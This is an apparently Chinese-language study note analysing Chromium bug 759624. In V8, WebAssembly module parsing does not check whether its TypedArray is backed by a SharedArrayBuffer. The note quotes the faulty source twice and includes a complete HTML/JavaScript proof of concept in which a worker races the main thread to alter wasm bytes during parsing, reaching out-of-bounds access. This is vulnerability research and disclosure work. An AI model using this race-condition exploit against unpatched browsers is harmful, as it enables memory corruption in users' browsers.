https://bugs.chromium.org/p/chromium/issues/detail?id=759624

### 前情提要

1、Web worker

我们都知道js是单线程模型。也就是说一次只能处理一件事情，前面的事情没有完毕，后面的事情要等待前面的事情处理完毕后才能执行。随着多核CPU的出现，我们可以最大限度的利用cpu多核，来提高js的性能。        
Worker接口可以创建后台任务。即可以给js运行新增线程。用于处理一些耗时、耗费性能的任务（异步的除外）。

2、SharedArrayBuffer

SharedArrayBuffer 顾名思义就是为线程间共享内存提供了一块内存缓冲区，你可以通过 postMessage 将线程 A 分配的 SAB 发送给线程 B，然后两个线程就可以共同访问这块内存。

这里简单放一个SAB和worker的使用示例：

```
下面的代码通过创建 SharedArrayBuffer 来分配一块共享内存：
var sab = new SharedArrayBuffer(1024);  // 1KiB shared memory

通过 postMessage 发送给另外一个 Worker 线程：
w.postMessage(sab)

Worker 接收 SharedArrayBuffer 对象：
var sab;
onmessage = function (ev) {
   sab = ev.data;  // 1KiB shared memory, the same memory as in the parent
}
```

### Root case

```
https://chromium.googlesource.com/v8/v8.git/+/07259a9ceafa078c9bb7f9ee1bb6f2d67256cc80/src/wasm/wasm-js.cc#69
i::wasm::ModuleWireBytes GetFirstArgumentAsBytes(
    const v8::FunctionCallbackInfo<v8::Value>& args, ErrorThrower* thrower) {
  ......
  } else if (source->IsTypedArray()) {    ------------------->source should be checked if it's backed by a SharedArrayBuffer
    // A TypedArray was passed.
    Local<TypedArray> array = Local<TypedArray>::Cast(source);
    Local<ArrayBuffer> buffer = array->Buffer();
    ArrayBuffer::Contents contents = buffer->GetContents();
    start =
        reinterpret_cast<const byte*>(contents.Data()) + array->ByteOffset();
    length = array->ByteLength();
  } 
  ......
  return i::wasm::ModuleWireBytes(start, start + length);
}
```

GetFirstArgumentAsBytes函数并没有对来自SharedArrayBuffer的数据做一个检测。

假设有这么一个场景：
我们将WebAssembly代码存在SharedArrayBuffer中，然后传输给webworker，这时候存储wasm代码的SAB将作为worker和主线程的共享内存。这样我们就可以在主线程解析wasm代码时，用工作线程同时修改代码，达到oob访问。（总的来说就是条件竞争）。

### poc

```
<html>
<h1>poc</h1>
<script id="worker1">
worker:{
    if (typeof window === 'object') break worker; // Bail if we're not a Worker
    self.onmessage = function(arg) {
        //%DebugPrint(arg.data);
        console.log("worker started");
        var ta = new Uint8Array(arg.data);
        //%DebugPrint(ta.buffer);
        var i =0;
        while(1){
            if(i==0){
                i=1;
                ta[51]=0;                               //--------------------->4)modify the webassembly code at the same time
            }else{
                i=0;
                ta[51]=128;
            }
        }
    }
}
</script>

<script>
function getSharedTypedArray(){
    var wasmarr = [
        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
        0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03,
        0x03, 0x02, 0x00, 0x00, 0x07, 0x12, 0x01, 0x0e,
        0x67, 0x65, 0x74, 0x41, 0x6e, 0x73, 0x77, 0x65,
        0x72, 0x50, 0x6c, 0x75, 0x73, 0x31, 0x00, 0x01,
        0x0a, 0x0e, 0x02, 0x04, 0x00, 0x41, 0x2a, 0x0b,
        0x07, 0x00, 0x10, 0x00, 0x41, 0x01, 0x6a, 0x0b
            ];
    var sb = new SharedArrayBuffer(wasmarr.length);           //------------------> 1)put WebAssembly code in a SharedArrayBuffer
    var sta = new Uint8Array(sb);
    for(var i=0;i<sta.length;i++)
        sta[i]=wasmarr[i];
    return sta;    
}
var blob = new Blob([
        document.querySelector('#worker1').textContent
        ], { type: "text/javascript" })

var worker = new Worker(window.URL.createObjectURL(blob));   //-------------------->2)create a web worker
var sta = getSharedTypedArray();
//%DebugPrint(sta.buffer);
worker.postMessage(sta.buffer);                              //-------------------->3)pass the WebAssembly code to the web worker


setTimeout(function(){
        while(1){
        try{
        //console.log(sta[50]);
        sta[51]=0;
        var myModule = new WebAssembly.Module(sta);          //--------------------->4)parse the webassembly code
        var myInstance = new WebAssembly.Instance(myModule);
        //myInstance.exports.getAnswerPlus1();
        }catch(e){
        ///console.log(e)
        }
        }
    },1000);

//worker.terminate(); 
</script>
</html>

I think the buggy code is in the following function
https://chromium.googlesource.com/v8/v8.git/+/07259a9ceafa078c9bb7f9ee1bb6f2d67256cc80/src/wasm/wasm-js.cc#69
i::wasm::ModuleWireBytes GetFirstArgumentAsBytes(
    const v8::FunctionCallbackInfo<v8::Value>& args, ErrorThrower* thrower) {
  ......
  } else if (source->IsTypedArray()) {    ------------------->source should be checked if it's backed by a SharedArrayBuffer
    // A TypedArray was passed.
    Local<TypedArray> array = Local<TypedArray>::Cast(source);
    Local<ArrayBuffer> buffer = array->Buffer();
    ArrayBuffer::Contents contents = buffer->GetContents();
    start =
        reinterpret_cast<const byte*>(contents.Data()) + array->ByteOffset();
    length = array->ByteLength();
  } 
  ......
  return i::wasm::ModuleWireBytes(start, start + length);
}
```

worker的写法很有意思，在这里mark一下。




